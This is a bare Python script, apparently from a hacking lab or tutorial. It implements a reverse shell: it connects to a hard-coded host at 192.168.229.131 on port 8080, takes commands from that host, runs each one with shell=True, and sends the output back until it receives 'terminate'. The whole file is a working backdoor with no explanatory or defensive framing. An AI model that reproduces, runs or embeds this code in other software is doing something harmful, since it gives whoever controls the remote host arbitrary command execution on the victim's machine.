import socket
import subprocess


def connect():
    Mysocket = socket.socket()
    Mysocket.connect(("192.168.229.131", 8080))

    while True:
        command = Mysocket.recv(1024)
        if "terminate" in command.decode():
            Mysocket.close()
            break

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            Mysocket.send(CMD.stdout.read())
            Mysocket.send(CMD.stderr.read())
def main():
    connect()
if __name__ == "__main__":
    main()